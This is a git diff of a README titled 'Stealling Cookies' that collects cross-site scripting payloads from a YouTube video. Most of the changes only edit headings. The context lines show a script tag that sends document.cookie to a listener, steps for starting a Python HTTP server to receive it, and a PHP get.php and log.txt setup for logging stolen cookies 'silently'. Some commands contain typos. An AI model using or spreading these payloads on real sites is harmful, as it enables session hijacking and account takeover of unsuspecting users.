@@ -1,13 +1,13 @@
 # Stealling Cookies
 
-All Payload that used from this Youtube Video:
+All Payload that used from this Youtube Video
 
 https://youtu.be/Kh1sgI5yLdk
 
 
 Payloads:
 
-# Takeing The Cookie From Python3 Server Listener:
+# Takeing The Cookie From Python3 Server Listener
 
 1 - Strat Python Server:
 
@@ -18,7 +18,7 @@ YasserREED > Python3 -m Server.http 3333 <- Any Port You Like!
 <script> window.location='https://127.0.0.1/:3333?cookie='+document.cookie </script> 
 
 
-# Send Cookies without go to another window :
+# Send Cookies without go to another window
 
 1 - Strat Python Server:
 
@@ -32,7 +32,7 @@ YasserREED> Python3 -m Server.http 3333 <- Any Port You Like!
 </script>  
 
 
-# Wirte PHP Code To Take the Cookie:
+# Wirte PHP Code To Take the Cookie
 
 1 - go to html File:
 
@@ -52,7 +52,7 @@ YasserRED> sudo touch log.txt
 
 YasserREED> sudo chmod 777 log.txt
 
-# Send The Cookie to log.txt by get.php using window.location() function:
+# Send The Cookie to log.txt by get.php using window.location() function
 
 1 - Write The Payload:
 
@@ -62,7 +62,7 @@ YasserREED> sudo chmod 777 log.txt
 
 3 - Check log.txt. //if not showen you can refresh the page 🔄
 
-# Take the cookie Silnce by get.php and send it to log.txt:
+# Take the cookie Silence by get.php and send it to log.txt
 
 1 - Write Payload:
 
